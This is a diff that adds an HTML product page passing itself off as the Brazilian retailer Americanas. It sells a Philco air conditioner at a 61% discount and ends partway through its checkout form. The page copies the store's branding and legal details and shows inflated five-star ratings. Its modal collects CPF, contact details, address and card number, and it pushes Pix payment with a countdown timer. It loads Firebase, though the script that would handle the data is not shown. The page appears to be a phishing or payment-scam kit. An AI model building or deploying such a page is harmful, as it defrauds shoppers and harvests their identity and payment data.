@@ -1,0 +1,866 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.5, user-scalable=yes">
+    <title>Americanas · Ar Condicionado Philco</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <style>
+        /* (mesmos estilos de antes, mantive igual) */
+        * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI', Roboto, sans-serif; }
+        body { background-color:#f0f2f5; }
+        .wrapper { max-width:1280px; margin:0 auto; background:white; box-shadow:0 0 20px rgba(0,0,0,0.05); }
+        .top-header { background:#e31e2e; color:white; padding:8px 20px; display:flex; align-items:center; justify-content:space-between; flex-wrap:wrap; gap:10px; }
+        .logo-area { display:flex; align-items:center; gap:10px; }
+        .logo-text { display:flex; flex-direction:column; align-items:center; justify-content:center; line-height:1.2; font-weight:800; font-size:24px; letter-spacing:-0.5px; color:white; text-transform:lowercase; }
+        .logo-line { width:100%; height:2px; background-color:white; margin:2px 0; }
+        .header-icons { display:flex; gap:15px; margin-left:15px; }
+        .header-icons i { font-size:20px; color:white; cursor:pointer; }
+        .search-bar { flex:1; min-width:200px; display:flex; background:white; border-radius:30px; overflow:hidden; }
+        .search-bar input { flex:1; border:none; padding:10px 18px; outline:none; font-size:15px; }
+        .search-bar button { background:white; border:none; padding:0 20px; color:#e31e2e; font-size:18px; cursor:pointer; }
+        .login-area { display:flex; align-items:center; gap:15px; }
+        .login-area i { font-size:24px; color:white; cursor:pointer; }
+        .nav-links { background:#f8f9fa; padding:10px 20px; border-bottom:1px solid #ddd; display:flex; flex-wrap:wrap; gap:15px; font-size:15px; color:#333; overflow-x:auto; }
+        .breadcrumb { padding:15px 20px; background:#f9f9f9; font-size:14px; color:#666; border-bottom:1px solid #eee; }
+        .breadcrumb i { margin:0 6px; color:#e31e2e; }
+        .product-container, .returns-container { padding:20px; display:block; }
+        .returns-container { display:none; }
+        .product-grid { display:grid; grid-template-columns:1fr 1.1fr; gap:30px; }
+        .gallery { display:flex; flex-direction:column; gap:15px; }
+        .main-image-container { position:relative; background:#f5f5f5; height:400px; border:1px solid #ddd; border-radius:8px; overflow:hidden; display:flex; align-items:center; justify-content:center; }
+        .main-image { width:100%; height:100%; object-fit:contain; }
+        .nav-arrow { position:absolute; top:50%; transform:translateY(-50%); background:rgba(255,255,255,0.7); border:none; width:40px; height:40px; border-radius:50%; display:flex; align-items:center; justify-content:center; cursor:pointer; font-size:20px; color:#e31e2e; transition:background 0.2s; z-index:10; }
+        .nav-arrow:hover { background:rgba(255,255,255,0.9); }
+        .nav-arrow.left { left:10px; }
+        .nav-arrow.right { right:10px; }
+        .thumbnails-row { display:flex; gap:10px; justify-content:center; flex-wrap:wrap; }
+        .thumb { width:80px; height:80px; border:1px solid #ccc; cursor:pointer; overflow:hidden; transition:border 0.2s; border-radius:4px; }
+        .thumb:hover { border-color:#e31e2e; }
+        .thumb img { width:100%; height:100%; object-fit:cover; }
+        .price-box { background:#fafafa; padding:20px; border-radius:10px; }
+        .old-price { text-decoration:line-through; color:#666; font-size:17px; }
+        .discount { background:#00a650; color:white; padding:2px 8px; border-radius:4px; font-size:15px; margin-left:10px; }
+        .pix-price { font-size:26px; font-weight:700; color:#00a650; }
+        .installment { font-size:17px; color:#333; margin:8px 0; display:flex; align-items:center; gap:8px; }
+        .installment i { color:#e31e2e; width:24px; }
+        .cep-block { display:flex; align-items:center; gap:10px; margin:20px 0; flex-wrap:wrap; }
+        .cep-block input { border:1px solid #ccc; border-radius:6px; padding:10px; width:150px; flex:1 1 auto; font-size:15px; }
+        .cep-block button { background:#e31e2e; color:white; border:none; padding:10px 20px; border-radius:6px; cursor:pointer; white-space:nowrap; font-size:15px; }
+        .endereco-info { background:#f5f5f5; border-left:4px solid #e31e2e; padding:15px; margin:15px 0; border-radius:8px; font-size:15px; display:none; }
+        .endereco-linha { display:flex; align-items:center; gap:8px; margin:5px 0; }
+        .endereco-linha i { color:#e31e2e; width:20px; text-align:center; }
+        .entrega-opcoes { display:flex; align-items:center; justify-content:space-between; margin-top:10px; padding-top:10px; border-top:1px solid #ddd; }
+        .entrega-item { display:flex; align-items:center; gap:8px; }
+        .entrega-item i { color:#00a650; }
+        .entrega-valor { font-weight:bold; color:#e31e2e; }
+        .quantity { margin:20px 0; display:flex; align-items:center; gap:10px; flex-wrap:wrap; font-size:16px; }
+        .quantity select { padding:8px; border-radius:6px; font-size:15px; }
+        .comprar-btn { background:#e31e2e; color:white; border:none; padding:14px 30px; font-size:18px; font-weight:bold; border-radius:8px; cursor:pointer; width:100%; min-height:52px; }
+        .info-block { margin-top:40px; border-top:1px solid #ddd; padding-top:30px; }
+        .info-block h3 { font-size:22px; margin:25px 0 10px; color:#333; display:flex; align-items:center; gap:8px; }
+        .info-block h3 i { color:#e31e2e; font-size:26px; }
+        .info-block p { line-height:1.6; color:#444; margin-bottom:20px; font-size:16px; }
+        .specs-table { width:100%; border-collapse:collapse; background:#fafafa; margin:15px 0; font-size:16px; }
+        .specs-table td { padding:12px 15px; border-bottom:1px solid #eee; }
+        .specs-table td:first-child { font-weight:600; width:150px; }
+        .rating-row { margin:20px 0; font-size:17px; }
+        .stars { color:#f5b342; margin-right:10px; }
+        .qa-item { margin:10px 0; padding:10px; background:#f9f9f9; border-radius:8px; font-size:16px; }
+        .qa-question { font-weight:600; color:#333; }
+        .qa-answer { color:#666; margin-top:5px; }
+        .seller-info { background:#f9f9f9; padding:15px; border-radius:8px; margin:20px 0; font-size:16px; }
+        .seller-info h4 { margin-bottom:10px; color:#333; }
+        .badges { display:flex; gap:15px; flex-wrap:wrap; margin:20px 0; }
+        .badge { background:#f0f0f0; padding:8px 15px; border-radius:30px; font-size:15px; display:flex; align-items:center; gap:5px; }
+        .badge i { color:#00a650; }
+        .modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); align-items:flex-start; justify-content:center; z-index:1000; padding:10px; overflow-y:auto; }
+        .modal-content { background:white; width:650px; max-width:100%; max-height:none; height:auto; overflow-y:visible; padding:30px 20px; border-radius:16px; position:relative; margin:auto; }
+        .close-modal { position:absolute; top:15px; right:20px; font-size:28px; cursor:pointer; min-width:44px; min-height:44px; display:flex; align-items:center; justify-content:center; }
+        .form-group { margin-bottom:15px; }
+        .form-group label { display:block; font-weight:600; margin-bottom:5px; font-size:15px; }
+        .form-group input, .form-group select { width:100%; padding:12px; border:1px solid #ccc; border-radius:6px; font-size:16px; }
+        .cep-row { display:flex; gap:10px; align-items:center; flex-wrap:wrap; }
+        .cep-row button { background:#e31e2e; color:white; border:none; padding:12px 20px; border-radius:6px; cursor:pointer; white-space:nowrap; min-height:48px; font-size:16px; }
+        .address-fields { margin-top:15px; display:grid; grid-template-columns:1fr 1fr; gap:10px; }
+        .address-fields .full-width { grid-column:span 2; }
+        .resumo-pedido { background:#f8f9fa; border-radius:12px; padding:20px; margin:10px 0 20px 0; display:flex; gap:20px; align-items:flex-start; border:1px solid #e9ecef; }
+        .resumo-pedido img { width:80px; height:80px; object-fit:cover; border-radius:8px; border:1px solid #dee2e6; }
+        .resumo-detalhes { flex:1; }
+        .resumo-detalhes h4 { font-size:16px; margin-bottom:10px; color:#212529; }
+        .resumo-linha { display:flex; justify-content:space-between; margin:5px 0; font-size:14px; color:#495057; }
+        .resumo-linha.total { font-weight:bold; color:#e31e2e; font-size:16px; border-top:1px dashed #ced4da; padding-top:8px; margin-top:8px; }
+        .payment-options { margin:20px 0; display:flex; gap:12px; flex-wrap:wrap; justify-content:center; }
+        .payment-option { flex:1 1 180px; border:2px solid #ddd; border-radius:12px; padding:12px; text-align:center; cursor:pointer; transition:all 0.2s; background:white; min-height:90px; display:flex; flex-direction:column; align-items:center; justify-content:center; }
+        .payment-option.selected { border-color:#00a650; background:#f0fff0; }
+        .payment-option i { font-size:28px; margin-bottom:6px; }
+        .payment-option.pix i { color:#00a650; }
+        .payment-option.card i { color:#e31e2e; }
+        .card-form { margin:20px 0; padding:20px; background:#f9f9f9; border-radius:12px; display:none; }
+        .card-form.show { display:block; }
+        .card-row { display:flex; gap:10px; flex-wrap:wrap; }
+        .card-row .form-group { flex:1 1 150px; }
+        .finalizar-red { background:#e31e2e; color:white; border:none; padding:14px; font-size:16px; font-weight:bold; border-radius:8px; width:100%; margin-top:20px; cursor:pointer; min-height:52px; }
+        .finalizar-red:disabled { background:#ccc; cursor:not-allowed; }
+        .pix-info { background:#f9f9f9; border-left:4px solid #00a650; padding:15px; margin:20px 0; border-radius:8px; font-size:16px; }
+        #entregaSection { display:none; margin-top:20px; }
+        .pix-screen { text-align:center; }
+        .timer { font-size:28px; font-weight:700; color:#000; margin:20px 0; }
+        .qr-placeholder { width:250px; height:250px; background:#ddd; margin:20px auto; display:flex; align-items:center; justify-content:center; border:2px solid black; max-width:100%; }
+        .pix-key { background:#f0f0f0; padding:12px; border-radius:30px; font-family:monospace; word-break:break-all; border:1px dashed #e31e2e; font-size:15px; }
+        .copy-btn, .confirm-btn { background:#e31e2e; color:white; border:none; padding:10px 24px; border-radius:30px; font-size:15px; margin:8px 0; cursor:pointer; width:auto; min-width:180px; min-height:44px; }
+        .confirm-btn { background:#00a650; }
+        .small-message { font-size:15px; color:#555; margin-bottom:5px; }
+        .expired-message { display:none; text-align:center; padding:30px 20px; }
+        .expired-message i { font-size:48px; color:#e31e2e; margin-bottom:15px; }
+        .expired-message p { font-size:18px; margin:10px 0; }
+        .expired-message button { background:#e31e2e; color:white; border:none; padding:12px 30px; border-radius:30px; font-size:16px; margin-top:20px; cursor:pointer; min-height:48px; }
+        .returns-container h2 { color:#e31e2e; margin-bottom:20px; }
+        .returns-section { margin:20px 0; border:1px solid #ddd; border-radius:8px; overflow:hidden; }
+        .returns-header { background:#f5f5f5; padding:15px; font-weight:bold; display:flex; align-items:center; gap:10px; cursor:pointer; min-height:60px; font-size:16px; }
+        .returns-header i { color:#e31e2e; transition:transform 0.3s; }
+        .returns-content { padding:15px; border-top:1px solid #ddd; background:white; line-height:1.6; font-size:15px; }
+        .hidden { display:none; }
+        .rotate { transform:rotate(90deg); }
+        .more-reviews { display:none; margin-top:10px; }
+        .more-reviews.show { display:block; }
+        .payment-status { margin:15px 0; padding:12px; border-radius:8px; font-weight:bold; text-align:center; display:none; }
+        .payment-status.error { display:block; background:#ffebee; color:#c62828; border:1px solid #ef9a9a; }
+        .payment-status.success { display:block; background:#e8f5e9; color:#2e7d32; border:1px solid #a5d6a7; }
+        .toast { visibility:hidden; min-width:250px; background-color:#333; color:#fff; text-align:center; border-radius:30px; padding:12px; position:fixed; bottom:30px; left:50%; transform:translateX(-50%); z-index:2000; opacity:0; transition:opacity 0.3s; }
+        .toast.show { visibility:visible; opacity:1; }
+        @keyframes shake { 0% { transform:translateX(0); } 25% { transform:translateX(-5px); } 50% { transform:translateX(5px); } 75% { transform:translateX(-5px); } 100% { transform:translateX(0); } }
+        .shake { animation:shake 0.3s ease-in-out; }
+        .verified-badge { background:#00a650; color:white; font-size:12px; padding:2px 6px; border-radius:4px; margin-left:8px; }
+        .rating-distribution { margin:20px 0; background:#f9f9f9; padding:15px; border-radius:8px; }
+        .rating-row-dist { display:flex; align-items:center; gap:10px; margin:8px 0; }
+        .stars-label { min-width:60px; font-weight:600; }
+        .progress-bar { flex:1; height:12px; background:#e0e0e0; border-radius:6px; overflow:hidden; }
+        .progress-fill { height:100%; background:#f5b342; border-radius:6px; }
+        .percentage { min-width:60px; text-align:right; color:#333; }
+        .review-helpful { margin-top:8px; font-size:14px; color:#666; display:flex; align-items:center; gap:15px; }
+        .review-helpful i { cursor:pointer; color:#e31e2e; margin-right:3px; }
+        @media (max-width:768px){ .top-header{flex-direction:row; flex-wrap:wrap;} .logo-area{flex:1; order:1;} .login-area{order:2;} .search-bar{flex:0 0 100%; order:3; margin-top:10px;} .gallery{flex-direction:column;} .main-image-container{order:1;} .thumbnails-row{order:2;} .product-grid{grid-template-columns:1fr;} .main-image-container{height:300px;} .price-box{padding:15px;} .pix-price{font-size:24px;} .comprar-btn{font-size:16px; padding:12px;} .modal-content{padding:25px 15px;} .address-fields{grid-template-columns:1fr;} .qr-placeholder{width:200px; height:200px;} .timer{font-size:24px;} }
+        @media (max-width:480px){ .main-image-container{height:250px;} .old-price{font-size:14px;} .pix-price{font-size:20px;} .cep-block button{padding:10px 15px;} .footer-links-mini{gap:10px; font-size:13px;} .modal-content{padding:20px 10px;} .cep-row{flex-direction:column;} .qr-placeholder{width:160px; height:160px;} .pix-key{font-size:12px;} .timer{font-size:22px;} .payment-option{flex:1 1 140px; min-width:140px;} }
+    </style>
+</head>
+<body>
+<div class="wrapper">
+    <!-- Header -->
+    <div class="top-header">
+        <div class="logo-area">
+            <div class="logo-text">
+                <div class="logo-line"></div>
+                <span>americanas</span>
+                <div class="logo-line"></div>
+            </div>
+            <div class="header-icons">
+                <i class="fas fa-home"></i>
+                <i class="fas fa-heart"></i>
+                <i class="fas fa-shopping-basket"></i>
+            </div>
+        </div>
+        <div class="search-bar">
+            <input type="text" placeholder="busque aqui seu produitoficial">
+            <button><i class="fas fa-search"></i></button>
+        </div>
+        <div class="login-area">
+            <i class="fas fa-user-circle"></i>
+        </div>
+    </div>
+
+    <div class="nav-links">
+        <span><i class="fas fa-store"></i> todos os departamentos</span>
+        <span>mercado</span><span>climatização</span><span>celulares</span><span>eletrodomésticos</span>
+        <span>informática</span><span>áudio e vídeo</span><span>eletroportáteis</span><span>móveis</span><span>ar condicionado</span>
+    </div>
+
+    <div class="breadcrumb" id="breadcrumb">
+        <i class="fas fa-home"></i> página inicial <i class="fas fa-chevron-right"></i> climatização <i class="fas fa-chevron-right"></i> ar condicionado <i class="fas fa-chevron-right"></i> split philco 9.000 btus
+    </div>
+
+    <div id="product-page" class="product-container">
+        <div class="product-grid">
+            <!-- Galeria -->
+            <div class="gallery">
+                <div class="main-image-container">
+                    <img id="mainProductImage" class="main-image" src="https://americanas.vtexassets.com/arquivos/ids/36913718-1280-auto/Ar-Condicionado-Split-Philco-Hi-Wall-9000-BTU-h-Frio-Bifasico-Branco-PAS9FT-220V.webp?v=639057512517430000&quality=9" alt="Ar Condicionado Split Philco 9.000 BTUs">
+                    <button class="nav-arrow left" id="prevImageBtn"><i class="fas fa-chevron-left"></i></button>
+                    <button class="nav-arrow right" id="nextImageBtn"><i class="fas fa-chevron-right"></i></button>
+                </div>
+                <div class="thumbnails-row">
+                    <div class="thumb" data-index="0"><img src="https://americanas.vtexassets.com/arquivos/ids/36913718-1280-auto/Ar-Condicionado-Split-Philco-Hi-Wall-9000-BTU-h-Frio-Bifasico-Branco-PAS9FT-220V.webp?v=639057512517430000&quality=9" alt=""></div>
+                    <div class="thumb" data-index="1"><img src="https://americanas.vtexassets.com/arquivos/ids/36913719-1280-auto/Ar-Condicionado-Split-Philco-Hi-Wall-9000-BTU-h-Frio-Bifasico-Branco-PAS9FT-220V.webp?v=639057512517600000&quality=9" alt=""></div>
+                    <div class="thumb" data-index="2"><img src="https://americanas.vtexassets.com/arquivos/ids/36913720-1280-auto/Ar-Condicionado-Split-Philco-Hi-Wall-9000-BTU-h-Frio-Bifasico-Branco-PAS9FT-220V.webp?v=639057512517600000&quality=9" alt=""></div>
+                </div>
+            </div>
+            <!-- Detalhes -->
+            <div class="details">
+                <h2 style="margin-top:0; margin-bottom:15px;">Ar Condicionado Split Philco Hi Wall 9.000 BTU/h Frio 220V Branco PAS9FT</h2>
+                <div class="price-box">
+                    <span class="old-price">R$ 1.887,78</span> <span class="discount">61%</span>
+                    <div class="pix-price">R$ 723,49 <span style="font-size:16px; color:#333;">no Pix</span></div>
+                    <div class="installment"><i class="fas fa-credit-card"></i> R$ 1.887,78 em até 8x de R$ 235,97 sem juros</div>
+                    <div class="installment"><i class="fas fa-credit-card"></i> Ou em até 12x de R$ 157,31 no cartão Cliente A</div>
+                </div>
+                <div class="badges"></div>
+                <div class="cep-block">
+                    <input type="text" placeholder="digite seu CEP" id="cepInput">
+                    <button id="calcFrete">ok</button>
+                    <span style="font-size:14px;">calcular frete e prazo</span>
+                </div>
+                
+                <div id="enderecoInfo" class="endereco-info">
+                    <div class="endereco-linha">
+                        <i class="fas fa-map-marker-alt"></i>
+                        <span id="enderecoCompleto"></span>
+                    </div>
+                    <div class="entrega-opcoes">
+                        <div class="entrega-item">
+                            <i class="fas fa-chevron-right"></i>
+                            <span>receber em até 10 dias úteis</span>
+                        </div>
+                        <div class="entrega-item">
+                            <i class="fas fa-truck"></i>
+                            <span class="entrega-valor" id="freteValorDisplay">Grátis</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="quantity">
+                    <span>quantidade:</span>
+                    <select id="quantidadeSelect">
+                        <option value="1">1 unidade</option>
+                        <option value="2">2 unidades</option>
+                        <option value="3">3 unidades</option>
+                    </select>
+                </div>
+                <button class="comprar-btn" id="comprarBtn"><i class="fas fa-shopping-cart"></i> Comprar</button>
+                
+                <p style="margin-top:20px;"><strong>Cor:</strong> <span style="border:1px solid; padding:4px 8px;">Branco</span></p>
+                <p><strong>Voltagem:</strong> 220V</p>
+                <p><a href="#" id="trocaLink" style="color:#e31e2e;"><i class="fas fa-undo-alt"></i> política de troca e devolução</a></p>
+            </div>
+        </div>
+
+        <!-- Informações, avaliações, perguntas, vendedor (igual ao original) -->
+        <div class="info-block">
+            <h3><i class="fas fa-info-circle"></i> Informações do Produto</h3>
+            <p>O Ar Condicionado Split Philco Hi Wall 9.000 BTU/h é a escolha perfeita para quem busca eficiência, conforto e durabilidade. Com serpentina em cobre, o aparelho oferece maior resistência e vida útil, além de contar com gás R410a, que é ecologicamente correto e proporciona um resfriamento mais eficiente.</p>
+            <p>Com modos de operação versáteis como Automático, Silêncio, Dormir e Oscilar, você pode personalizar a experiência de climatização de acordo com suas necessidades. A serpentina em cobre assegura maior durabilidade ao aparelho, enquanto o filtro lavável antibacteriano e antipó facilita a manutenção e a limpeza no dia a dia, garantindo um ar mais puro. A pintura anticorrosiva oferece proteção extra contra oxidação e maresia, tornando-o ideal para regiões litorâneas.</p>
+
+            <h3><i class="fas fa-clipboard-list"></i> Ficha Técnica</h3>
+            <table class="specs-table">
+                <tr><td>Capacidade</td><td>9.000 BTU/h</td></tr>
+                <tr><td>Voltagem</td><td>220V</td></tr>
+                <tr><td>Classificação Energética</td><td>F</td></tr>
+                <tr><td>Ciclo</td><td>Frio</td></tr>
+                <tr><td>Área indicada</td><td>Até 15 m²</td></tr>
+                <tr><td>Modelo</td><td>PAS9FT</td></tr>
+                <tr><td>Cor</td><td>Branco</td></tr>
+                <tr><td>Tecnologia Inverter</td><td>Não</td></tr>
+                <tr><td>Gás Refrigerante</td><td>R-410A</td></tr>
+                <tr><td>Sistema de Fase</td><td>Monofásico</td></tr>
+                <tr><td>Serpentina</td><td>Cobre</td></tr>
+                <tr><td>Nível de Ruído (Evaporadora)</td><td>40 dB</td></tr>
+                <tr><td>Nível de Ruído (Condensadora)</td><td>55 dB</td></tr>
+                <tr><td>Tubulação</td><td>1/4” e 3/8”</td></tr>
+                <tr><td>Potência</td><td>880 W</td></tr>
+                <tr><td>Vazão de ar</td><td>500 m³/h</td></tr>
+                <tr><td>Dimensões Evaporadora (AxLxP)</td><td>21 x 81,1 x 27 cm</td></tr>
+                <tr><td>Dimensões Condensadora (AxLxP)</td><td>53,6 x 38 x 47 cm</td></tr>
+                <tr><td>Peso Evaporadora</td><td>8,5 kg</td></tr>
+                <tr><td>Peso Condensadora</td><td>19 kg</td></tr>
+                <tr><td>Garantia</td><td>12 meses</td></tr>
+            </table>
+
+            <h3><i class="fas fa-star"></i> Avaliações dos Clientes</h3>
+            <div class="rating-row">
+                <span class="stars">★★★★★</span> 5.0/5 (10 avaliações)
+                <span style="margin-left:15px;"><a href="#" id="queroAvaliarBtn" style="color:#e31e2e;"><i class="fas fa-pencil-alt"></i> Quero avaliar</a></span>
+            </div>
+            <div class="rating-distribution">
+                <div class="rating-row-dist"><span class="stars-label">5 estrelas</span><div class="progress-bar"><div class="progress-fill" style="width:100%"></div></div><span class="percentage">100%</span></div>
+                <div class="rating-row-dist"><span class="stars-label">4 estrelas</span><div class="progress-bar"><div class="progress-fill" style="width:0%"></div></div><span class="percentage">0%</span></div>
+                <div class="rating-row-dist"><span class="stars-label">3 estrelas</span><div class="progress-bar"><div class="progress-fill" style="width:0%"></div></div><span class="percentage">0%</span></div>
+                <div class="rating-row-dist"><span class="stars-label">2 estrelas</span><div class="progress-bar"><div class="progress-fill" style="width:0%"></div></div><span class="percentage">0%</span></div>
+                <div class="rating-row-dist"><span class="stars-label">1 estrela</span><div class="progress-bar"><div class="progress-fill" style="width:0%"></div></div><span class="percentage">0%</span></div>
+            </div>
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
+                <span><strong>5 avaliações para esse produto</strong></span>
+                <span style="color:#666;">ordenar: <select id="sortSelect" style="padding:5px;"><option value="helpful">Mais úteis</option><option value="recent">Mais recentes</option></select></span>
+            </div>
+            <div id="reviewsContainer"></div>
+            <p><a href="#" id="verMaisAvaliacoes" style="display:none;">Ver todas as 5 avaliações</a></p>
+
+            <h3><i class="fas fa-question-circle"></i> Perguntas & respostas</h3>
+            <div class="qa-item"><div class="qa-question">P: Este ar condicionado é bifásico ou monofásico?</div><div class="qa-answer">R: O modelo é monofásico, voltagem 220V.</div></div>
+            <div class="qa-item"><div class="qa-question">P: Qual a área indicada para refrigeração?</div><div class="qa-answer">R: Ideal para ambientes de até 15 m².</div></div>
+            <div class="qa-item"><div class="qa-question">P: Vem com controle remoto?</div><div class="qa-answer">R: Sim, acompanha controle remoto.</div></div>
+            <div class="qa-item"><div class="qa-question">P: É necessário fazer instalação especializada?</div><div class="qa-answer">R: Recomenda-se instalação por profissional qualificado.</div></div>
+            <p><a href="#">Ver mais perguntas</a></p>
+
+            <h3><i class="fas fa-store"></i> Sobre o vendedor</h3>
+            <div class="seller-info">
+                <h4>Philco Oficial</h4>
+                <p><i class="fas fa-map-marker-alt"></i> São Paulo - SP</p>
+                <p><i class="fas fa-star"></i> 4.9/5 (15.678 vendas)</p>
+                <p><i class="fas fa-clock"></i> Membro desde 2012</p>
+                <p><a href="#">Ver loja</a></p>
+            </div>
+
+            <div class="footer-links-mini">
+                <span>sac 4003 4848</span>
+                <span>guia de segurança</span>
+                <span>volta às aulas</span>
+                <span>entregas e devoluções</span>
+            </div>
+
+            <div class="footer-sections">
+                <div><h4>Institucional</h4><ul><li>investidores americanas sa</li><li>governança corporativa</li><li>lojas americanas</li><li>assessoria de imprensa</li><li>trabalhe conosco</li><li>nossas lojas</li><li>volta às aulas</li><li>cadastro de proteção à propriedade intelectual</li><li>canal de denúncias</li><li>programa de afiliados</li></ul></div>
+                <div><h4>Dúvidas</h4><ul><li>central de atendimento</li><li>entregas e devoluções</li><li>mapa do site</li><li>processo de entrega</li><li>aviso de privacidade</li><li>regras do site</li><li>guia de segurança</li><li>termos e condições de compra e venda de produtos</li><li>procon-rj</li><li>verifique o código anatel</li><li>cupom de desconto</li><li>marketplace</li><li>regras para compras internacionais</li></ul></div>
+                <div><h4>Serviços</h4><ul><li>cliente a</li><li>tipos de entrega</li><li>seguro roubo e furto</li><li>instalação de ar condicionado</li><li>garantia estendida</li><li>vale presente</li><li>para empresas</li><li>confira todos</li></ul></div>
+                <div><h4>AME Digital</h4><ul><li>comunicado</li></ul></div>
+            </div>
+
+            <div class="payment-methods">
+                <strong>Formas de pagamento:</strong> Mastercard, Visa, Elo, American Express, Aura, Diners Club, Hipercard; BrasilCard; Cartão Cliente a; Pix.
+            </div>
+            <p style="font-size:14px; color:#666;">Imagens meramente ilustrativas. Todas as informações divulgadas são de responsabilidade do fabricante/fornecedor.</p>
+            <div class="procon-row">
+                <span>Selo Procon</span>
+                <span class="logo-footer-img">americanas</span>
+            </div>
+            <div class="social-row">
+                <i class="fab fa-instagram"></i> instagram americanas ·
+                <i class="fab fa-youtube"></i> youtube americanas ·
+                <i class="fab fa-facebook"></i> facebook americanas ·
+                <i class="fab fa-tiktok"></i> tiktok americanas
+            </div>
+            <div class="cnpj-row">
+                americanas s.a. / CNPJ: 00.776.574/0006-60 / Inscrição Estadual: 85.687.08-5 / Endereço Rua Sacadura Cabral, 102 - Rio de Janeiro, RJ - 20081-902
+            </div>
+            <div class="mapa-site">Mapa do site</div>
+        </div>
+    </div>
+
+    <div id="returns-page" class="returns-container">
+        <h2><i class="fas fa-undo-alt"></i> devolução</h2>
+        <p>Você pode conferir todos os detalhes na nossa política de entregas e devoluções...</p>
+        <div class="returns-section">
+            <div class="returns-header" onclick="toggleSection(this)"><i class="fas fa-chevron-right"></i> Resumo da política</div>
+            <div class="returns-content hidden"><p><strong>Política de devoluções:</strong></p><p>- Para devolver um produto o prazo é de até 7 (sete) dias corridos;</p><p>- A exceção são os itens de moda como bolsas, sapatos e roupas, vendidos e entregues pela Americanas, que podem ser devolvidos em até 30 (trinta) dias corridos;</p><p>- Estando dentro desses prazos, a devolução é grátis!</p></div>
+        </div>
+        <div class="returns-section">
+            <div class="returns-header" onclick="toggleSection(this)"><i class="fas fa-chevron-right"></i> Casos sem reembolso</div>
+            <div class="returns-content hidden"><p>Importante lembrar que não fazemos a devolução do valor se:</p><p>- Não houver uma solicitação de devolução registrada antes pelo Minha Conta;</p><p>- A solicitação estiver fora do prazo;</p><p>- A gente receber o que você devolveu no Centro de Distribuição da Americanas, analisar e não estiver tudo de acordo com o que foi relatado;</p><p>- O produto tiver itens/acessórios que não foram devolvidos junto com ele.</p></div>
+        </div>
+        <p><a href="#" id="backToProduct" style="color:#e31e2e;">← voltar para o produto</a></p>
+    </div>
+</div>
+
+<!-- Modal de compra -->
+<div id="checkoutModal" class="modal">
+    <div class="modal-content" id="modalContent">
+        <span class="close-modal" id="closeModal">&times;</span>
+        <div id="checkoutStep1">
+            <h2>Dados pessoais</h2>
+            <div id="dadosPessoaisContainer" class="dados-pessoais-container">
+                <div class="form-group"><label>E-mail</label><input type="email" id="email" placeholder="obrigatório"></div>
+                <div class="form-group"><label>Primeiro nome</label><input type="text" id="primeiroNome" placeholder="obrigatório"></div>
+                <div class="form-group"><label>Último nome</label><input type="text" id="ultimoNome" placeholder="obrigatório"></div>
+                <div class="form-group"><label>CPF</label><input type="text" id="cpf" placeholder="000.000.000-00" maxlength="14"></div>
+                <div class="form-group"><label>Telefone</label><input type="text" id="telefone" placeholder="(21) 99999-9999" maxlength="15"></div>
+            </div>
+
+            <div id="entregaSection">
+                <h2 style="margin-top:30px;">Entrega</h2>
+                <div id="enderecoContainer">
+                    <div class="form-group">
+                        <label>CEP</label>
+                        <div class="cep-row">
+                            <input type="text" id="modalCep" placeholder="digite seu CEP" maxlength="9">
+                            <button id="buscarCep">OK</button>
+                        </div>
+                    </div>
+                    <div class="address-fields">
+                        <div class="form-group full-width"><label>Logradouro</label><input type="text" id="rua" placeholder="Rua, Avenida..."></div>
+                        <div class="form-group"><label>Número</label><input type="text" id="numero" placeholder="nº"></div>
+                        <div class="form-group"><label>Complemento</label><input type="text" id="complemento" placeholder="opcional"></div>
+                        <div class="form-group"><label>Bairro</label><input type="text" id="bairro" placeholder="Bairro"></div>
+                        <div class="form-group"><label>Cidade</label><input type="text" id="cidade" placeholder="Cidade"></div>
+                        <div class="form-group"><label>UF</label><input type="text" id="uf" placeholder="UF" maxlength="2"></div>
+                    </div>
+                </div>
+
+                <h2 style="margin-top:30px;">Resumo do pedido</h2>
+                <div class="resumo-pedido" id="resumoPedido">
+                    <img src="https://americanas.vtexassets.com/arquivos/ids/36913718-1280-auto/Ar-Condicionado-Split-Philco-Hi-Wall-9000-BTU-h-Frio-Bifasico-Branco-PAS9FT-220V.webp?v=639057512517430000&quality=9" alt="Ar Condicionado Philco">
+                    <div class="resumo-detalhes">
+                        <h4>Ar Condicionado Split Philco 9.000 BTUs</h4>
+                        <div class="resumo-linha"><span>Subtotal</span> <span id="resumoSubtotal">R$ 1.887,78</span></div>
+                        <div class="resumo-linha"><span>Descontos</span> <span id="resumoDescontos">- R$ 1.164,29</span></div>
+                        <div class="resumo-linha"><span>Entrega</span> <span id="resumoEntrega">R$ 0,00</span></div>
+                        <div class="resumo-linha total"><span>Total</span> <span id="resumoTotal">R$ 723,49</span></div>
+                    </div>
+                </div>
+
+                <h2 style="margin-top:30px;">Forma de pagamento</h2>
+                <div class="payment-options">
+                    <div class="payment-option pix selected" id="optionPix" onclick="selectPayment('pix')">
+                        <i class="fab fa-pix"></i><span>Pix</span>
+                    </div>
+                    <div class="payment-option card" id="optionCard" onclick="selectPayment('card')">
+                        <i class="fas fa-credit-card"></i><span>Cartão</span>
+                    </div>
+                </div>
+
+                <div class="pix-info" id="pixInfo" style="display:block;">
+                    <p><span class="step">1.</span> Aperte em Finalizar compra para gerar o código QR</p>
+                    <p><span class="step">2.</span> Confira os dados e realize o pagamento pelo app do seu banco</p>
+                </div>
+
+                <div class="card-form" id="cardForm">
+                    <h3>Dados do cartão</h3>
+                    <div class="form-group"><label>Número do cartão</label><input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19"></div>
+                    <div class="form-group"><label>Nome no cartão</label><input type="text" id="cardName" placeholder="Como está no cartão"></div>
